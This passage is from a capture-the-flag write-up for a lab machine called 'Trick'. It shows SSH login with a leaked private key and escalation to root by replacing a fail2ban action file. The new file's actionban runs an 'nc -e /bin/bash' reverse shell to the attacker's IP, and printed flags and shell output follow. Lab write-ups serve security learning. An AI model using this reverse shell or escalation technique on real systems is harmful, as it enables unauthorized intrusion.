+3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>And now we can connect to the machine as <code>michael</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> michael@10.10.11.166  
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ cat user.txt
+f18c1dcd02ec3adadbd54c9c8c4d94be
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>This user is able to run <code>/etc/init.d/fail2ban restart</code> as <code>root</code> without password using <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+</code></pre></div><p>After searching for ways to escalate privileges using <code>fail2ban</code>, we reach to <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">this blog post</a>.</p><p>Notice that we have an additional group, and this group owns the directory <code>/etc/fail2ban/action.d</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)  
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ find / -group security 2&gt;/dev/null
+/etc/fail2ban/action.d
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ ls -l /etc/fail2ban
+total 60
+drwxrwx--- 2 root security  4096 Jul  6 04:21 <span class="code-blue">action.d</span>
+-rw-r--r-- 1 root root      2334 Jul  6 04:21 fail2ban.conf
+drwxr-xr-x 2 root root      4096 Jul  6 04:21 <span class="code-blue">fail2ban.d</span>
+drwxr-xr-x 3 root root      4096 Jul  6 04:21 <span class="code-blue">filter.d</span>
+-rw-r--r-- 1 root root     22908 Jul  6 04:21 jail.conf
+drwxr-xr-x 2 root root      4096 Jul  6 04:21 <span class="code-blue">jail.d</span>
+-rw-r--r-- 1 root root       645 Jul  6 04:21 paths-arch.conf
+-rw-r--r-- 1 root root      2827 Jul  6 04:21 paths-common.conf
+-rw-r--r-- 1 root root       573 Jul  6 04:21 paths-debian.conf
+-rw-r--r-- 1 root root       738 Jul  6 04:21 paths-opensuse.conf
+</code></pre></div><p>The <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">blog post</a> says that one way to run commands is entering an <code>actionban</code> with a malicious command in <code>iptables-multiport.conf</code>. If we try to modify the file, we are not allowed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ ls -l /etc/fail2ban/action.d/iptables-multiport.conf
+-rw-r--r-- 1 root root 1420 Jul  6 04:00 /etc/fail2ban/action.d/iptables-multiport.conf
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ echo 'actionban = nc -e /bin/bash 10.10.17.44 4444' &gt;&gt; /etc/fail2ban/action.d/iptables-multiport.conf  
+-bash: /etc/fail2ban/action.d/iptables-multiport.conf: Permission denied
+</code></pre></div><p>However, since we belong to <code>security</code> and this group owns the directory, we are able to create and remove files. Then, let&rsquo;s create a copy of the needed file, remove it and create it again with the malicious content (for instance, a reverse shell command):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/x
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ vim /tmp/x
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ rm /etc/fail2ban/action.d/iptables-multiport.conf
+rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ cp /tmp/x /etc/fail2ban/action.d/iptables-multiport.conf
+<span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ grep -v '^#' /etc/fail2ban/action.d/iptables-multiport.conf | grep .
+[INCLUDES]
+before = iptables-common.conf
+[Definition]
+actionstart = &lt;iptables&gt; -N f2b-&lt;name&gt;
+              &lt;iptables&gt; -A f2b-&lt;name&gt; -j &lt;returntype&gt;
+              &lt;iptables&gt; -I &lt;chain&gt; -p &lt;protocol&gt; -m multiport --dports &lt;port&gt; -j f2b-&lt;name&gt;  
+actionstop = &lt;iptables&gt; -D &lt;chain&gt; -p &lt;protocol&gt; -m multiport --dports &lt;port&gt; -j f2b-&lt;name&gt;
+             &lt;actionflush&gt;
+             &lt;iptables&gt; -X f2b-&lt;name&gt;
+actioncheck = &lt;iptables&gt; -n -L &lt;chain&gt; | grep -q 'f2b-&lt;name&gt;[ \t]'
+actionban = /usr/bin/nc -e /bin/bash 10.10.17.44 4444
+actionunban = &lt;iptables&gt; -D f2b-&lt;name&gt; -s &lt;ip&gt; -j &lt;blocktype&gt;
+[Init]
+</code></pre></div><p>Now we restart the service using <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">michael@trick</span>:<span class="code-blue">~</span>$ sudo /etc/init.d/fail2ban restart
+[ <span class="code-dark-green">ok</span> ] Restarting fail2ban (via systemctl): fail2ban.service.  
+</code></pre></div><p>And when the server bans our IP address, we will get a reverse shell. For that, we need to enter bad passwords in SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> michael@10.10.11.166
+michael@10.10.11.166's password:
+Permission denied, please try again.
+michael@10.10.11.166's password:
+Permission denied, please try again.
+michael@10.10.11.166's password:
+michael@10.10.11.166: Permission denied (publickey,password).  
+</code></pre></div><p>We get a connection back:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )  
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.166.
+Ncat: Connection from 10.10.11.166:51548.
+script /dev/null -c bash
+Script started, file is /dev/null
+root@trick:/# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[2]  - continued  ncat -nlvp 4444
+                                 reset xterm
+root@trick:/# export TERM=xterm
+root@trick:/# export SHELL=bash
+root@trick:/# stty rows 50 columns 158
+</code></pre></div><p>Now we are <code>root</code> and thus, we have <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@trick:/# cat /root/root.txt  
+2fe2e985794dd7cb023636997cefebeb
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#dns-enumeration">DNS enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-sqli">Exploiting SQLi</a></li><li><a href="#finding-an-lfi">Finding an LFI</a></li><li><a href="#obtaining-rce">Obtaining RCE</a></li></ul></li><li><a href="#lateral-movement-to-user-michael">Lateral movement to user <code>michael</code></a><ul><li><a href="#finding-another-lfi">Finding another LFI</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit="return window.open(&#34;https://tinyletter.com/7Rocky&#34;,&#34;popupwindow&#34;,&#34;scrollbars=yes,width=800,height=600&#34;),!0"><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
